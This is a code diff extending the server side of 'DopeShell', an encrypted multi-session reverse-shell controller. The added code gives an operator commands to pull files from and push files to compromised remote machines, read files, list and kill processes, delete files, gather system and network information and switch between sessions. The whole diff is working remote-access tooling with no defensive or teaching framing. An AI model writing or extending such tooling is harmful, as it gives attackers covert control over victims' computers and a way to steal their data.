@@ -4,6 +4,8 @@ import socket
 import threading
 import base64
 import os
+import struct
+import platform
 import argparse
 from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
 from cryptography.hazmat.backends import default_backend
@@ -19,6 +21,37 @@ class DopeShellServer:
         self.sessions = {}
         self.session_counter = 1
         self.active_session = None
+        self.commands = {
+            'help': 'List all commands and their usage.',
+            'exit': 'Terminate the session.',
+            'switch <session_id>': 'Switch to another active session.',
+            'sessions': 'List all active sessions.',
+            'upload <local_path> <remote_path>': 'Upload a file from the local machine to the remote machine.',
+            'download <remote_path> <local_path>': 'Download a file from the remote machine to the local machine.',
+            'pwd': 'Print the current working directory on the remote machine.',
+            'cd <directory>': 'Change the current working directory on the remote machine.',
+            'ls [directory]': 'List files in the specified or current directory on the remote machine.',
+            'ps': 'List running processes on the remote machine.',
+            'netstat': 'Show network connections on the remote machine.',
+            'ifconfig/ipconfig': 'Show network configuration (depending on OS).',
+            'cat <file_path>': 'Display the contents of a file on the remote machine.',
+            'info': 'Display system information of the remote machine.',
+            'mkdir <directory>': 'Create a new directory on the remote machine.',
+            'delete <file_path>': 'Delete a file on the remote machine.',
+            'kill <pid>': 'Kill a process on the remote machine by PID.',
+            'clear': 'Clear the screen in the shell.',
+            'find <filename>': 'Find a file by name on the remote machine.',
+            'sysinfo': 'Display detailed system information.',
+        }
+
+    def receive_data(self, client_socket):
+        # Read the data length first
+        data_length = struct.unpack('>I', client_socket.recv(4))[0]
+        data = b""
+        while len(data) < data_length:
+            chunk = client_socket.recv(4096)
+            data += chunk
+        return self.decrypt(data)
 
     def encrypt(self, data):
         iv = os.urandom(16)
@@ -40,9 +73,93 @@ class DopeShellServer:
             if session_id != self.active_session:
                 continue
             command = input(f"Session {session_id} Shell> ")
+            
             if command.lower() == 'exit':
                 client_socket.send(self.encrypt(command.encode('utf-8')))
                 break
+
+            if command.lower().startswith('help'):
+                parts = command.split(maxsplit=1)
+                if len(parts) > 1:
+                    specific_command = parts[1].lower()
+                    description = self.commands.get(specific_command, "Command not found.")
+                    help_text = f"{specific_command}: {description}"
+                else:
+                    help_text = "DopeShell Tool Help\n" \
+                                "====================\n" \
+                                "List of available commands:\n"
+                    for cmd, desc in self.commands.items():
+                        help_text += f"  {cmd:<30} - {desc}\n"
+                    help_text += "\nFor detailed information on a specific command, type 'help <command>'"
+                
+                print(help_text)
+                client_socket.send(self.encrypt(help_text.encode('utf-8')))
+                continue
+
+            elif command.lower().startswith('ls'):
+                client_socket.send(self.encrypt(command.encode('utf-8')))
+                response = client_socket.recv(4096)
+                print(self.decrypt(response).decode('utf-8'))
+
+            elif command.lower().startswith('pwd'):
+                client_socket.send(self.encrypt(command.encode('utf-8')))
+                response = client_socket.recv(4096)
+                print(self.decrypt(response).decode('utf-8'))
+
+            elif command.lower().startswith('cd'):
+                client_socket.send(self.encrypt(command.encode('utf-8')))
+                response = client_socket.recv(4096)
+                print(self.decrypt(response).decode('utf-8'))
+
+            elif command.lower().startswith('download'):
+                _, remote_path = command.split()
+                client_socket.send(self.encrypt(command.encode('utf-8')))
+                with open(os.path.basename(remote_path), 'wb') as f:
+                    while True:
+                        file_data = self.decrypt(client_socket.recv(4096))
+                        if file_data == b'EOF':
+                            break
+                        f.write(file_data)
+                print(f"[+] Downloaded {remote_path} from the client.")
+
+            elif command.lower().startswith('upload'):
+                _, local_path = command.split()
+                client_socket.send(self.encrypt(f"upload {os.path.basename(local_path)}".encode('utf-8')))
+                with open(local_path, 'rb') as f:
+                    while chunk := f.read(4096):
+                        client_socket.send(self.encrypt(chunk))
+                client_socket.send(self.encrypt(b'EOF'))
+                response = client_socket.recv(4096)
+                print(self.decrypt(response).decode('utf-8'))
+
+            elif command.lower() == 'info':
+                client_socket.send(self.encrypt(command.encode('utf-8')))
+                response = client_socket.recv(4096)
+                print(self.decrypt(response).decode('utf-8'))
+
+            elif command.lower() in ['mkdir', 'delete', 'kill', 'clear', 'find', 'sysinfo']:
+                client_socket.send(self.encrypt(command.encode('utf-8')))
+                response = client_socket.recv(4096)
+                print(self.decrypt(response).decode('utf-8'))
+
+            elif command.lower().startswith('cat'):
+                client_socket.send(self.encrypt(command.encode('utf-8')))
+                response = self.receive_data(client_socket)
+                print(response.decode('utf-8'))
+
+            elif command.lower() in ['ifconfig', 'ipconfig', 'find']:
+                client_socket.send(self.encrypt(command.encode('utf-8')))
+                response = self.receive_data(client_socket)
+                print(response.decode('utf-8'))
+
+            elif command.lower() in ['ps', 'netstat']:
+                client_socket.send(self.encrypt(command.encode('utf-8')))
+                response = self.receive_data(client_socket)
+                print(response.decode('utf-8'))
+            
+            elif command.lower() == 'sessions':
+                self.list_sessions()
+
             elif command.lower().startswith("switch"):
                 _, new_session_id = command.split()
                 if int(new_session_id) in self.sessions:
@@ -51,14 +168,20 @@ class DopeShellServer:
                 else:
                     print(f"[-] Session {new_session_id} does not exist.")
                 continue
-            client_socket.send(self.encrypt(command.encode('utf-8')))
-            response = client_socket.recv(4096)
-            print(self.decrypt(response).decode('utf-8'))
+            else:
+                client_socket.send(self.encrypt(command.encode('utf-8')))
+                response = client_socket.recv(4096)
+                print(self.decrypt(response).decode('utf-8'))
+
         client_socket.close()
+        del self.sessions[session_id]  # Remove session on exit
+        if not self.sessions:
+            self.active_session = None  # Reset active session if no sessions remain
+
 
     def run(self):
         print(f"[*] Listening on {self.host}:{self.port}")
-        while True:
+        while True: 
             client_socket, addr = self.sock.accept()
             session_id = self.session_counter
             print(f"[*] Connection from {addr}, Session ID: {session_id}")
